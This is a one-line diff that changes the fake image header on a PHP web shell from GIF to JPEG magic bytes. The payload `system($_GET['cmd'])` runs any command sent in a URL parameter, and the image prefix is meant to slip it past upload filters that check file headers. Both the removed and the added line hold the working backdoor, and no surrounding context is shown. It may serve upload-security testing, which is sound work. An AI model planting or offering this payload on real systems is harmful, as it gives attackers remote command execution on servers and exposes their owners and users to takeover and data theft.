@@ -1,1 +1,1 @@
-\x47\x49\x46\x38\x39\x61<?php system(\$_GET['cmd']); ?>
+\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>
